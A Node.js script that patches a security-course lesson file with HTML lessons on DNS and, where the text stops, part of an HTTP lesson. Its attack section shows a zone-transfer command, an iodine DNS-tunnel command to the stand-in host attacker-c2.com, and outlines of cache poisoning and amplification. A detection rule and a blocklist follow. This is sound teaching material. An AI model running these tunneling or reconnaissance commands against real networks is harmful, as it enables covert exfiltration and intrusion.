import { readFileSync, writeFileSync } from 'fs';

const filePath = 'C:/Users/carls/Repos/fsociety/src/data/lessonContent.ts';
const content = readFileSync(filePath, 'utf8');
const lines = content.split('\n');

function findBlockEnd(lines, startLine) {
  let depth = 0;
  let started = false;
  for (let i = startLine; i < lines.length; i++) {
    for (const ch of lines[i]) {
      if (ch === '{') { depth++; started = true; }
      if (ch === '}') { depth--; }
    }
    if (started && depth === 0) return i;
  }
  return -1;
}

// 0-indexed line numbers
const dnsStart = 383;
const httpStart = 555;
const reconStart = 752;

const dnsEnd = findBlockEnd(lines, dnsStart);
const httpEnd = findBlockEnd(lines, httpStart);
const reconEnd = findBlockEnd(lines, reconStart);

// ─────────────────────────────────────────────────────────────────────────────
// DNS REPLACEMENT
// ─────────────────────────────────────────────────────────────────────────────
const dnsReplacement = `  'dns': {
    concept: \`
<h2>The Domain Name System: From HOSTS.TXT to Global Infrastructure</h2>

<h3>The World Before DNS — HOSTS.TXT and Its Breaking Point</h3>
<p>
  In the early days of the ARPANET, every computer on the network maintained a single
  text file called <strong>HOSTS.TXT</strong>, managed by the Stanford Research Institute
  Network Information Center (SRI-NIC). This file mapped every known hostname to its
  IP address. If you wanted to reach another machine, your HOSTS.TXT had to have the entry.
</p>
<p>
  Every site would periodically download a fresh copy of HOSTS.TXT from SRI-NIC over FTP.
  In the late 1970s, this was manageable — there were only a few hundred hosts. But by 1982
  the ARPANET was growing explosively. By 1983 the master HOSTS.TXT file had ballooned to
  nearly <strong>2 megabytes</strong> — enormous for the era — and the coordination problem
  was becoming catastrophic. Every time a new machine was added, the SRI-NIC had to be
  contacted. Name collisions were constant. The file was always out of date by the time you
  downloaded it. Update traffic was choking the network itself.
</p>
<p>
  The Internet needed something fundamentally different: a distributed, hierarchical,
  automatically replicated database that could scale to millions or billions of entries
  without any central coordination bottleneck.
</p>

<h3>Paul Mockapetris and the Invention of DNS (1983)</h3>
<p>
  In November 1983, Paul Mockapetris published <strong>RFC 882</strong> and <strong>RFC 883</strong>,
  describing the Domain Name System. It was one of the most architecturally elegant solutions
  in computing history. Instead of a central file, Mockapetris proposed a distributed tree
  of <em>zones</em>, each delegated to the organization responsible for it, each replicating
  automatically to redundant secondary servers. No single organization would ever again need
  to maintain a list of every host on the internet.
</p>
<p>
  The key insight was <strong>delegation</strong>: the root would delegate .com to Verisign,
  Verisign would delegate google.com to Google, Google would delegate mail.google.com to
  whoever they chose. Each level only needed to know about the next level down in its own
  subtree. The system scaled to billions of domains because no single server ever held the
  whole picture.
</p>
<p>
  Today's DNS, described by RFCs 1034 and 1035 (1987 revisions), implements these exact
  principles. Every time you visit a website, you rely on infrastructure Paul Mockapetris
  designed forty years ago.
</p>

<h3>The DNS Hierarchy — A Tree of Delegation</h3>
<p>
  The DNS namespace is organized as an inverted tree. At the very top is the
  <strong>root zone</strong>, represented by a single dot (.). Below it are
  <strong>Top-Level Domains (TLDs)</strong>, then second-level domains, then subdomains.
</p>
<pre><code>                        . (root)
                       /    \\
                    .com    .org    .io    .gov    .uk ...
                   /   \\
           google.com  github.com  amazon.com ...
               |
          mail.google.com   maps.google.com   ...</code></pre>

<h4>The Root Zone and Its Servers</h4>
<p>
  The root zone is served by <strong>13 named root server clusters</strong>, labeled A through M
  (a.root-servers.net through m.root-servers.net). These are not 13 physical machines — using
  <strong>IP anycast</strong>, each letter-name resolves to hundreds of physical servers
  distributed worldwide. As of 2025 there are over 1,800 root server instances globally.
  The 12 organizations operating them include:
</p>
<ul>
  <li><strong>Verisign</strong> (A and J root servers)</li>
  <li><strong>ICANN</strong> (L root server, also administers the root zone file)</li>
  <li><strong>NASA Ames Research Center</strong> (G root server)</li>
  <li><strong>US Army Research Lab</strong> (H root server)</li>
  <li><strong>University of Maryland</strong> (D root server)</li>
  <li><strong>Internet Systems Consortium</strong> (F root server)</li>
  <li><strong>RIPE NCC</strong> (K root server, serving European internet coordination)</li>
</ul>
<p>
  Root servers do not know where google.com is. They only know which TLD servers are
  responsible for .com, .org, .io, and every other TLD. That is their entire job.
</p>

<h3>Step-by-Step DNS Resolution — Every Hop Explained</h3>
<p>
  When your browser needs to resolve a domain name, it follows a precise chain of queries.
  Here is the complete walk-through for resolving <strong>github.com</strong>:
</p>
<pre><code>Step 1: Browser DNS Cache
  Browser checks its internal cache.
  If github.com was visited recently and TTL has not expired → done.
  Otherwise → continue.

Step 2: Operating System Cache
  OS checks its resolver cache (Windows: ipconfig /displaydns, Linux: nscd).
  If found and not expired → done. Otherwise → continue.

Step 3: /etc/hosts (or C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts)
  OS checks the local hosts file.
  If an entry exists → use it (overrides DNS entirely).
  Otherwise → continue.

Step 4: Recursive Resolver Query
  OS sends a query to the configured recursive resolver.
  This is typically your router (which forwards to your ISP's resolver),
  or a public resolver like 8.8.8.8 (Google) or 1.1.1.1 (Cloudflare).
  Query: "What is the IP address for github.com? Type A."

Step 5: Resolver Checks Its Own Cache
  If the resolver recently resolved github.com → returns cached answer.
  Otherwise → resolver begins iterative resolution.

Step 6: Resolver Queries Root Server
  Resolver asks a root server (e.g., a.root-servers.net):
  "Who handles .com?"
  Root replies with a referral: "Try the .com TLD servers at a.gtld-servers.net"

Step 7: Resolver Queries .com TLD Server
  Resolver asks a.gtld-servers.net:
  "Who handles github.com?"
  TLD server replies: "ns1.p16.dynect.net and ns2.p16.dynect.net"

Step 8: Resolver Queries GitHub's Authoritative Nameserver
  Resolver asks ns1.p16.dynect.net:
  "What is the A record for github.com?"
  Authoritative server replies: "140.82.114.4, TTL 3600"

Step 9: Caching and Response
  Resolver caches the answer for 3600 seconds (1 hour).
  Resolver returns 140.82.114.4 to the original client.
  Browser connects to 140.82.114.4 on port 443.</code></pre>

<blockquote>
  The entire resolution chain from Step 6 through Step 8 typically completes in
  20–100 milliseconds. The recursive resolver does all the hard work on your behalf,
  which is why it is called a <em>recursive</em> resolver. Your client only makes one
  query; the resolver makes many.
</blockquote>

<h3>Every DNS Record Type — The Complete Reference</h3>

<h4>A Record — IPv4 Address Mapping</h4>
<pre><code>github.com.     3600  IN  A  140.82.114.4</code></pre>
<p>Maps a hostname to a 32-bit IPv4 address. The most fundamental record type.
A single hostname can have multiple A records for load balancing or redundancy.</p>

<h4>AAAA Record — IPv6 Address Mapping</h4>
<pre><code>cloudflare.com.  300  IN  AAAA  2606:4700::6810:84e5</code></pre>
<p>Maps a hostname to a 128-bit IPv6 address. "AAAA" because IPv6 is four times
the size of IPv4.</p>

<h4>MX Record — Mail Exchanger</h4>
<pre><code>google.com.  3600  IN  MX  10  aspmx.l.google.com.
google.com.  3600  IN  MX  20  alt1.aspmx.l.google.com.
google.com.  3600  IN  MX  30  alt2.aspmx.l.google.com.</code></pre>
<p>Specifies which mail servers accept email for a domain. The number (10, 20, 30) is
the <strong>priority</strong> — lower number means higher priority. Mail delivery tries
the lowest priority server first; if it fails, it tries the next. MX records must point
to hostnames, never IP addresses directly.</p>

<h4>CNAME Record — Canonical Name (Alias)</h4>
<pre><code>www.github.com.  3600  IN  CNAME  github.com.</code></pre>
<p>Creates an alias from one hostname to another. The key limitation: <strong>you cannot
use a CNAME at the zone apex (root domain)</strong>. You cannot CNAME example.com itself
because the zone apex must have SOA and NS records, which cannot coexist with a CNAME.
This is why CDNs like Cloudflare invented "CNAME flattening" or "ALIAS records" — they
resolve the CNAME chain at the authoritative nameserver and return A records directly,
working around the RFC restriction.</p>

<h4>NS Record — Name Server</h4>
<pre><code>github.com.  172800  IN  NS  ns1.p16.dynect.net.
github.com.  172800  IN  NS  ns2.p16.dynect.net.</code></pre>
<p>Delegates authority for a zone to specific nameservers. Every domain must have at
least two NS records. Note the extremely long TTL (172800 = 48 hours) — NS records
change rarely and benefit from aggressive caching.</p>

<h4>SOA Record — Start of Authority</h4>
<pre><code>github.com.  3600  IN  SOA  ns1.p16.dynect.net. (
    hostmaster.github.com.  ; RNAME: zone admin email (@ replaced with .)
    2024011501              ; SERIAL: version number (YYYYMMDDNN format)
    3600                    ; REFRESH: secondary polls primary every hour
    900                     ; RETRY: retry failed refresh after 15 min
    604800                  ; EXPIRE: secondary uses cached data up to 7 days
    300                     ; NEGATIVE TTL: cache NXDOMAIN for 5 minutes
)</code></pre>
<p>Every zone has exactly one SOA record. It controls zone replication timing and
negative caching. The serial number must be incremented every time the zone changes,
or secondary nameservers will not pick up updates.</p>

<h4>TXT Record — Arbitrary Text</h4>
<pre><code>; SPF — which servers may send email for this domain
acme.com.  3600  IN  TXT  "v=spf1 include:_spf.google.com ~all"

; DKIM — public key for email signature verification
selector._domainkey.acme.com.  IN  TXT  "v=DKIM1; k=rsa; p=MIGfMA0GC..."

; DMARC — email authentication policy
_dmarc.acme.com.  IN  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@acme.com"

; Let's Encrypt domain validation
_acme-challenge.acme.com.  IN  TXT  "xKjb8randomvalidationtoken"</code></pre>
<p>TXT records are used for almost everything that does not have its own record type:
SPF for email anti-spoofing, DKIM public keys for email signing, DMARC policy,
domain ownership verification for TLS certificates, and Google/Microsoft site verification.</p>

<h4>PTR Record — Reverse DNS</h4>
<pre><code>4.114.82.140.in-addr.arpa.  3600  IN  PTR  lb-140-82-114-4-fra.github.com.</code></pre>
<p>Maps an IP address back to a hostname. The IP is reversed and appended to in-addr.arpa.
Reverse DNS is critical for email deliverability (mail servers check that your sending IP
has a PTR record) and for meaningful log files (logs show hostnames rather than raw IPs).</p>

<h4>SRV Record — Service Location</h4>
<pre><code>_sip._tcp.acme.com.  3600  IN  SRV  10  20  5060  sipserver.acme.com.</code></pre>
<p>Format: <strong>priority weight port target</strong>. Used by SIP (VoIP), XMPP, and
other protocols to discover service endpoints and ports dynamically from DNS, without
hardcoding IPs. The weight field allows load distribution between servers of equal priority.</p>

<h4>CAA Record — Certificate Authority Authorization</h4>
<pre><code>acme.com.  3600  IN  CAA  0  issue "letsencrypt.org"
acme.com.  3600  IN  CAA  0  issuewild ";"
acme.com.  3600  IN  CAA  0  iodef "mailto:security@acme.com"</code></pre>
<p>Specifies which Certificate Authorities are permitted to issue TLS certificates for
your domain. If a CA receives a certificate request for a domain whose CAA record does not
list that CA, the CA must refuse. This prevents unauthorized certificate issuance by
rogue CAs. The <em>issuewild</em> tag controls wildcard certificates specifically.</p>

<h4>DNSSEC Records — DNSKEY, DS, RRSIG</h4>
<pre><code>; DNSKEY — zone's public signing key
acme.com.  3600  IN  DNSKEY  256 3 13 oJMRESz5E4gYzS...

; DS — delegation signer (in parent zone, links to child DNSKEY)
acme.com.  3600  IN  DS  2371 13 2 1F987CC...

; RRSIG — cryptographic signature over an RRset
acme.com.  3600  IN  RRSIG  A 13 2 3600 20240201 20240101 12345 acme.com. abc...</code></pre>
<p>DNSSEC adds cryptographic authentication to DNS. A chain of trust runs from the
root zone (whose key is in every DNSSEC-validating resolver) down to every signed zone.</p>

<h3>DNS Caching, TTL, and Why It Matters to Attackers</h3>
<p>
  Every DNS record carries a <strong>Time To Live (TTL)</strong> value in seconds. Resolvers
  cache the answer for that many seconds before querying again. This has profound security implications:
</p>
<ul>
  <li><strong>Very low TTL (60 seconds or less)</strong>: C2 operators use this for
  <em>fast-flux</em> — rotating infrastructure IP addresses faster than defenders can blocklist them.
  Malware families like Emotet rotated their C2 IPs every 60 seconds using low-TTL domains.</li>
  <li><strong>Very high TTL (days)</strong>: Legitimate CDNs and large organizations use this
  for performance. The downside: if you need to change an IP (e.g., incident response, DDoS
  migration), cached old records persist across the internet for days.</li>
  <li><strong>Negative caching</strong>: When a domain does not exist (NXDOMAIN), resolvers
  cache that negative answer for the SOA's minimum TTL. This prevents hammering nameservers
  with repeated queries for non-existent names.</li>
</ul>

<h3>Split-Horizon DNS</h3>
<p>
  Many organizations run <strong>split-horizon DNS</strong> (also called split-brain DNS):
  the same domain resolves differently depending on whether you query from inside or outside
  the corporate network. Internal users querying internal-dns.acme.com might get
  192.168.1.100 for <em>crm.acme.com</em>, while the same query from the internet returns
  an NXDOMAIN (the CRM is not internet-facing at all).
</p>
<p>
  This is a defense-in-depth measure: internal services are not discoverable via external DNS,
  reducing attack surface. However, it complicates VPN configurations and can cause hard-to-debug
  resolution failures when split-horizon is misconfigured.
</p>

<h3>DNS over HTTPS (DoH) and DNS over TLS (DoT)</h3>
<p>
  Traditional DNS runs over UDP port 53 in complete plaintext. This means your ISP, network
  administrators, and anyone running a passive tap can see every domain you query — a significant
  privacy problem. Two modern protocols address this:
</p>
<ul>
  <li><strong>DNS over TLS (DoT)</strong> — wraps DNS queries inside a TLS connection on
  TCP port 853. The DNS wire format is unchanged; only the transport is encrypted. Easy for
  firewalls to identify (dedicated port) and allows enterprises to monitor while still
  encrypting from ISP.</li>
  <li><strong>DNS over HTTPS (DoH)</strong> — sends DNS queries inside HTTPS on port 443.
  Indistinguishable from regular web traffic. Firefox and Chrome now ship with DoH enabled by
  default, routing through Cloudflare or Google regardless of the OS-configured resolver.</li>
</ul>
<blockquote>
  DoH creates a major tension for enterprise security teams. When an endpoint bypasses the
  corporate DNS resolver and uses DoH to Cloudflare, the organization loses the ability to
  log DNS queries, enforce RPZ (Response Policy Zones) blocking, and detect DNS-based C2
  or data exfiltration. Defenders must either block DoH at the firewall level or enroll
  in a managed DoH service that still provides logging.
</blockquote>
\`,
    technique: \`
<h2>How Attackers Weaponize DNS</h2>

<h3>Zone Transfer (AXFR) — The Reconnaissance Goldmine</h3>
<p>
  DNS zone transfers are a legitimate mechanism by which secondary nameservers replicate
  the complete contents of a zone from a primary. When an organization runs primary and
  secondary DNS servers, the secondary periodically requests an AXFR (full zone transfer)
  to stay synchronized. This is normal, expected, and necessary.
</p>
<p>
  The catastrophic misconfiguration is allowing <strong>any host on the internet</strong>
  to request a zone transfer — not just authorized secondaries. The BIND9 default
  configuration prior to version 9.x permitted this. Millions of DNS servers were
  deployed with this misconfiguration, and many remain vulnerable today. A 2023 study
  found that approximately <strong>4.7% of nameservers</strong> still respond to AXFR
  requests from arbitrary sources.
</p>
<pre><code># Step 1: Find the authoritative nameservers
dig NS acme.com
; ANSWER SECTION:
; acme.com.  172800  IN  NS  ns1.acme.com.
; acme.com.  172800  IN  NS  ns2.acme.com.

# Step 2: Attempt zone transfer from each NS
dig AXFR acme.com @ns1.acme.com

# If misconfigured, the response is the ENTIRE zone:
; acme.com.          IN  SOA   ns1.acme.com. hostmaster.acme.com. ...
; acme.com.          IN  NS    ns1.acme.com.
; mail.acme.com.     IN  A     203.0.113.25     ← mail server
; vpn.acme.com.      IN  A     203.0.113.30     ← VPN gateway (prime target)
; dev.acme.com.      IN  A     10.0.0.50        ← dev environment
; internal.acme.com. IN  A     10.0.0.100       ← internal system on RFC1918 space!
; db.acme.com.       IN  A     10.0.0.200       ← database server
; legacy.acme.com.   IN  A     203.0.113.45     ← old system, old vulns
; jenkins.acme.com.  IN  A     203.0.113.50     ← CI/CD pipeline
; admin.acme.com.    IN  A     203.0.113.55     ← admin panel

# Complete infrastructure map delivered in one unauthenticated query.
# The attacker now knows every hostname, every IP, the internal IP range,
# which systems face the internet, and the naming convention (useful for guessing
# additional undiscovered hostnames).</code></pre>

<h3>Subdomain Enumeration — Beyond Zone Transfers</h3>
<p>
  When zone transfers are blocked, attackers use multiple complementary techniques
  to enumerate subdomains:
</p>
<ul>
  <li><strong>Certificate Transparency</strong>: Every TLS certificate must be logged to public CT logs.
  Query <code>crt.sh/?q=%.acme.com</code> to retrieve all subdomains that have ever had
  a certificate issued. This is entirely passive — the target never sees a single packet.</li>
  <li><strong>DNS brute force</strong>: Tools like <em>gobuster dns</em>, <em>amass</em>,
  and <em>subfinder</em> try thousands of common subdomain prefixes (mail, vpn, dev, api,
  admin, staging, test, jenkins, gitlab, jira...). A good wordlist against a mid-size company
  typically finds 20–50% of subdomains within minutes.</li>
  <li><strong>Passive DNS databases</strong>: Services like SecurityTrails, DNSDB, and VirusTotal
  maintain historical records of DNS resolutions observed across millions of resolvers globally.
  They have seen DNS queries your target's users have made — revealing subdomains that are
  not in any CT log because they use self-signed certificates.</li>
  <li><strong>Reverse IP lookup</strong>: If an IP address hosts multiple virtual hosts
  (shared hosting or CDN), services like HackerTarget's reverse-ip lookup reveal all domains
  sharing that IP. Neighbors on a shared host may share vulnerabilities.</li>
</ul>

<h3>The Kaminsky Attack — DNS Cache Poisoning (2008)</h3>
<p>
  In 2008, security researcher Dan Kaminsky discovered a critical vulnerability in how DNS
  resolvers work — a flaw so severe that it triggered one of the most coordinated emergency
  patch events in internet history. Every major DNS resolver vendor released patches
  <em>simultaneously</em> on a single coordinated day to prevent attackers from learning
  the details before patches deployed.
</p>
<p>
  DNS queries are matched to responses using a 16-bit <strong>transaction ID</strong> — a
  random number from 0 to 65,535. The classic cache poisoning attack involved guessing this
  ID. With 65,536 possible values, an attacker could try to beat the legitimate resolver's
  response by flooding it with forged responses. With 1 query per second from the target
  resolver, an attacker had a 1/65,536 chance per try — typically taking hours.
</p>
<p>
  Kaminsky's insight was the <strong>Bailiwick Rule</strong> bypass. Rather than poisoning a
  single hostname's A record directly (which the resolver would verify against the queried
  zone), Kaminsky poisoned the <em>NS record</em> for the entire zone. By repeatedly
  querying for <em>random.acme.com</em> (a name that definitely does not exist, so the
  resolver must ask upstream), and simultaneously flooding forged responses claiming
  "the authoritative NS for acme.com is evil.attacker.com", an attacker could:
</p>
<ol>
  <li>Force the resolver to generate thousands of outbound queries (one per random subdomain)</li>
  <li>Each query creates a new transaction ID guessing opportunity</li>
  <li>With 65,536 transactions IDs and near-unlimited queries, success was achievable in seconds</li>
</ol>
<p>
  The fix was <strong>source port randomization</strong>: instead of always sending DNS queries
  from port 53, resolvers now choose a random source port from 1024–65535. This effectively
  adds ~16 more bits of entropy, making brute-force practically infeasible. DNSSEC is the
  complete cryptographic fix — signed records cannot be forged regardless of the attack.
</p>

<h3>DNS Tunneling — Data Exfiltration and C2 Over DNS</h3>
<p>
  Corporate firewalls rigorously control outbound traffic — blocking HTTP to uncategorized
  sites, restricting SMTP, monitoring HTTPS. But almost <strong>nothing blocks outbound
  UDP port 53</strong> — DNS must work for internet access to function at all. This makes
  DNS the ideal covert channel for data exfiltration and command-and-control communication.
</p>
<p>
  The principle: encode data in DNS query subdomains. If an attacker controls the authoritative
  nameserver for <em>attacker-c2.com</em>, any DNS query for any subdomain of that domain
  is logged at the attacker's server. Encoded data goes in the subdomain labels; encoded
  responses come back in TXT or CNAME records.
</p>
<pre><code># Tool: iodine — creates an IP tunnel over DNS
# Attacker runs iodined on VPS with NS record delegated to it:
# ns1.attacker-c2.com. → VPS IP

# Victim side:
iodine -f attacker-c2.com
# iodine encodes IP packets as DNS queries:
# "aGVsbG8.attacker-c2.com" → data chunk encoded in base32
# Each query carries ~100 bytes; responses carry ~200 bytes
# Effective throughput: ~1 KB/sec (slow but sufficient for reverse shell)

# Tool: dnscat2 — C2 channel over DNS
# Creates encrypted C2 channel inside DNS queries
# Supports shell sessions, file transfer, port forwarding
# All traffic looks like DNS queries to legitimate-seeming domain

# What detection looks like from the defender's side:
# - Queries to attacker-c2.com are long and high-entropy
# - Query rate to single domain is abnormally high (hundreds per minute)
# - TXT and NULL record types queried frequently (unusual for legitimate use)
# - Base32/base64 character patterns in subdomain labels</code></pre>

<h3>Fast-Flux DNS — Protecting C2 Infrastructure</h3>
<p>
  When law enforcement or defenders identify a C2 server's IP address and get it
  null-routed or seized, the botnet goes offline. Fast-flux DNS is the botnet operator's
  solution: rotate IP addresses so rapidly that blocking is futile.
</p>
<ul>
  <li><strong>Single-flux</strong>: The C2 domain (e.g., <em>evil.com</em>) has dozens of
  A records, each pointing to a different bot acting as a proxy. TTL is set to 60 seconds.
  Every minute, the A record set rotates to fresh IPs. Blocklisting any individual IP only
  works for 60 seconds. The real C2 server is hidden behind the rotating proxies.</li>
  <li><strong>Double-flux</strong>: Both the A records <em>and</em> the NS records rotate.
  The nameservers resolving evil.com are themselves part of the botnet, changing every minute.
  This makes takedown even harder because even seizing the NS records does not kill the domain.</li>
</ul>
<p>
  Real-world examples: the Storm botnet (2007) pioneered fast-flux at scale. Conficker (2009)
  used domain generation algorithms (DGAs) combined with fast-flux. Modern ransomware
  affiliates routinely use bulletproof hosters with fast-flux infrastructure.
</p>

<h3>DNS Amplification DDoS</h3>
<p>
  DNS amplification exploits two properties of UDP: the source IP is not verified
  (trivially spoofed), and DNS responses can be vastly larger than queries.
</p>
<pre><code># Attack anatomy:
# Attacker sends DNS query with victim's IP as source
# Query: "ANY isc.org" — small query (~60 bytes)
# Response: very large (3,000 bytes) — amplification factor 50x

# At scale:
# Attacker controls botnet sending 1 Gbps of query traffic
# DNS resolvers amplify to 50 Gbps hitting the victim
# Victim's upstream link is saturated

# 2013 Spamhaus DDoS: 300 Gbps — largest recorded at the time
# Used open DNS resolvers worldwide as amplifiers
# Targeted Spamhaus (anti-spam org) via CloudFlare

# Open resolver check (test if your resolver is misconfigured):
# dig +short test.openresolver.com TXT @your-resolver-ip
# Response "open-resolver-confirmed" means it will amplify for anyone</code></pre>
\`,
    defense: \`
<h2>Hardening DNS — Comprehensive Defense</h2>

<h3>Blocking Unauthorized Zone Transfers</h3>
<p>
  Zone transfers should only be permitted between explicitly authorized nameservers.
  The fix is simple to configure and absolutely mandatory:
</p>
<pre><code># BIND9 — named.conf.local
zone "acme.com" {
    type master;
    file "/etc/bind/zones/acme.com.zone";
    # ONLY allow transfers to designated secondary nameservers:
    allow-transfer { 203.0.113.252; 203.0.113.253; };
    # Never: allow-transfer { any; };
};

# Verify your fix from an external host:
dig AXFR acme.com @ns1.acme.com
# Expected response: "Transfer failed." or connection refused

# Windows DNS Server — PowerShell:
Set-DnsServerPrimaryZone -Name "acme.com" -SecureSecondaries TransferToZoneNameServer
# Or restrict to specific IP list:
Set-DnsServerPrimaryZone -Name "acme.com" -SecondaryServers "203.0.113.252","203.0.113.253" \`
    -SecureSecondaries TransferToSecureServers</code></pre>

<h3>DNSSEC — Cryptographic Authentication for DNS</h3>
<p>
  DNSSEC adds a chain of cryptographic signatures to DNS responses, making it
  impossible for an attacker to inject forged records into a resolver's cache.
  The chain of trust works as follows:
</p>
<ol>
  <li>The root zone is signed with a well-known key (the Root KSK — Key Signing Key).
  Every DNSSEC-validating resolver ships with this key hardcoded.</li>
  <li>Each child zone (e.g., .com) has its DNSKEY record signed by the parent (root),
  creating a DS (Delegation Signer) record in the parent zone.</li>
  <li>Each domain (e.g., acme.com) has its own DNSKEY record signed by the .com zone,
  and that zone signs all its own records with RRSIG records.</li>
  <li>A validating resolver follows the chain: root key → .com DS → acme.com DNSKEY
  → RRSIG on the A record → verified answer.</li>
</ol>
<pre><code># Enable DNSSEC validation on a BIND9 recursive resolver:
options {
    dnssec-validation auto;  # Use built-in root trust anchors
};

# Check DNSSEC status of any domain:
dig +dnssec cloudflare.com A
# Look for: "ad" flag in the header (Authenticated Data)
# Look for: RRSIG records in the ANSWER section

# More detailed validation check:
delv @1.1.1.1 cloudflare.com A
# Output: "; fully validated" means chain of trust is intact
# Output: "; negative response, fully validated" means NXDOMAIN is signed

# Sign your own zone with BIND9:
dnssec-keygen -a ECDSAP256SHA256 -n ZONE acme.com
dnssec-signzone -A -3 $(head -c 6 /dev/urandom | od -An -tx1 | tr -d ' \\n') \
    -N INCREMENT -o acme.com -t acme.com.zone</code></pre>

<h3>DNS Monitoring and Anomaly Detection</h3>
<p>
  Comprehensive DNS logging is one of the highest-value investments a security team can make.
  DNS is the first indicator of many attack types: malware calling home, data exfiltration
  via tunneling, DGA (domain generation algorithm) activity, and phishing staging.
</p>
<pre><code># Windows: Enable DNS Debug Logging
Set-DnsServerDiagnostics -All $true
# Logs to: C:\\\\Windows\\\\System32\\\\dns\\\\dns.log

# Linux BIND9: query logging
logging {
    channel query_log {
        file "/var/log/named/queries.log" versions 10 size 50m;
        severity dynamic;
        print-time yes;
    };
    category queries { query_log; };
};

# Zeek (network-level DNS logging):
# /opt/zeek/logs/current/dns.log captures all DNS on the wire
# Fields: ts, uid, id.orig_h, id.resp_h, query, qtype, answers, TTLs

# Sigma detection rule — DNS tunneling (high entropy subdomains):
title: Potential DNS Tunneling via High-Entropy Subdomain
detection:
    selection:
        dns.question.name|re: '(?:[A-Za-z0-9+/]{30,})\\..*'
    filter:
        dns.question.name|endswith:
            - '.microsoft.com'
            - '.google.com'
            - '.windowsupdate.com'
    condition: selection and not filter
level: medium

# Alert thresholds for DNS anomaly detection:
# - More than 500 DNS queries per minute from a single host (tunneling/DGA)
# - More than 5 unique domains queried ending in newly registered TLD
# - DNS query labels longer than 50 characters
# - High ratio of NXDOMAIN responses from single host (DGA scanning)
# - ANY or NULL record type queries from endpoints (amplification setup)</code></pre>

<h3>DNS Response Policy Zones (RPZ) — Recursive Resolver Blocking</h3>
<p>
  RPZ allows a recursive resolver to override DNS responses based on policy rules —
  effectively blocking malicious domains at the DNS level before any TCP connection
  is established. This is one of the most effective and lightweight defenses available.
</p>
<pre><code># BIND9 RPZ configuration:
options {
    response-policy { zone "rpz.blocklist.local"; };
};

zone "rpz.blocklist.local" {
    type master;
    file "/etc/bind/rpz.blocklist.local.zone";
};

# RPZ zone file — block known malicious domains:
$TTL 60
@  SOA  localhost. root.localhost. 1 1h 15m 30d 2h
@  NS   localhost.

; Block specific malicious domain (return NXDOMAIN):
evil-c2-domain.com    CNAME  .

; Block entire zone and wildcard subdomains:
evil-c2-domain.com    CNAME  .
*.evil-c2-domain.com  CNAME  .

; Redirect to a sinkhole (for logging/analysis):
phishing-site.ru      CNAME  sinkhole.internal.

# Commercial RPZ feeds:
# - Quad9 (9.9.9.9): free, blocks malware domains
# - Cisco Umbrella: enterprise, feeds updated in real-time from Talos
# - Infoblox BloxOne Threat Defense: enterprise RPZ + analytics</code></pre>

<h3>Defending Against DNS Amplification — Response Rate Limiting</h3>
<pre><code># BIND9 — Response Rate Limiting (RRL):
options {
    rate-limit {
        responses-per-second 10;      # Max 10 identical responses/sec/IP
        referrals-per-second 5;
        nodata-per-second 5;
        errors-per-second 5;
        nxdomains-per-second 5;
        window 5;                     # Sliding window in seconds
        slip 2;                       # 1 in N responses get through (reduces attack impact)
        exempt-clients { 203.0.113.252; };  # Whitelist trusted resolvers
    };
};

# BCP 38 — Network Ingress Filtering (ISP level):
# Block packets arriving at your network with source IPs
# that cannot legitimately originate from your customer's prefix.
# Prevents your customers from spoofing source IPs for amplification.
# Reference: https://tools.ietf.org/html/bcp38</code></pre>

<h3>DoH/DoT Enterprise Strategy</h3>
<p>
  DoH-enabled browsers will bypass your corporate DNS resolver, taking DNS logging and RPZ
  blocking offline. The defense strategy:
</p>
<ul>
  <li><strong>Block outbound port 853 (DoT)</strong> at the firewall — easy to enumerate
  and block since it uses a dedicated port.</li>
  <li><strong>Block known DoH resolvers by IP</strong>: Cloudflare (1.1.1.1, 1.0.0.1),
  Google (8.8.8.8, 8.8.4.4), NextDNS, Quad9. Maintain a blocklist at the firewall.</li>
  <li><strong>Use DNS-over-HTTPS enterprise resolvers</strong>: Services like Cloudflare
  Gateway and Cisco Umbrella offer DoH endpoints that still log queries and enforce RPZ —
  giving you encrypted DNS without losing visibility.</li>
  <li><strong>Enforce via Group Policy</strong>: Disable DoH in Chrome and Firefox via
  enterprise policy settings. For Chrome: <code>DnsOverHttpsMode: off</code>.</li>
</ul>
\`,
  },`;

// ─────────────────────────────────────────────────────────────────────────────
// HTTP-HTTPS REPLACEMENT
// ─────────────────────────────────────────────────────────────────────────────
const httpReplacement = `  'http-https': {
    concept: \`
<h2>HTTP and HTTPS: The Foundation of the Web</h2>

<h3>A Brief History — From CERN to HTTP/3</h3>
<p>
  In 1989, <strong>Tim Berners-Lee</strong> at CERN wrote a proposal called "Information
  Management: A Proposal." His boss, Mike Sendall, wrote "Vague but exciting" in the margin
  and approved it. That document became the blueprint for the World Wide Web. In 1991,
  Berners-Lee implemented the first web server and browser, communicating via a protocol
  he called HTTP — HyperText Transfer Protocol.
</p>
<ul>
  <li><strong>HTTP/0.9 (1991)</strong>: Literally one command. <code>GET /page.html</code>.
  No headers, no status codes, no MIME types. The response was just raw HTML then connection close.</li>
  <li><strong>HTTP/1.0 (1996, RFC 1945)</strong>: Added headers (Content-Type, Content-Length),
  status codes (200 OK, 404 Not Found), methods beyond GET. Each request still opened a new
  TCP connection — expensive for pages with many resources.</li>
  <li><strong>HTTP/1.1 (1997, RFC 2068; revised RFC 2616)</strong>: Persistent connections
  (Connection: keep-alive), chunked transfer encoding, the mandatory Host header (enabling
  virtual hosting — multiple websites on one IP), cache control headers, byte-range requests.
  HTTP/1.1 dominated for nearly 20 years.</li>
  <li><strong>HTTP/2 (2015, RFC 7540)</strong>: Binary protocol (not text), request
  <em>multiplexing</em> over a single TCP connection (multiple requests in flight
  simultaneously without head-of-line blocking), HPACK header compression (reducing
  header overhead by 85%), server push (proactively sending resources before the client asks).</li>
  <li><strong>HTTP/3 (2022, RFC 9114)</strong>: Replaces TCP with <strong>QUIC</strong>
  (Quick UDP Internet Connections) at the transport layer. QUIC is built on UDP, implements
  its own reliable delivery and congestion control, and integrates TLS 1.3 natively. The key
  win: eliminating TCP head-of-line blocking. In HTTP/2, a single lost TCP packet stalls all
  multiplexed streams. QUIC gives each stream independent loss recovery.</li>
</ul>

<h3>HTTP Request Anatomy — Every Component</h3>
<pre><code>POST /api/v1/users/login HTTP/1.1
Host: acme.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 47
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
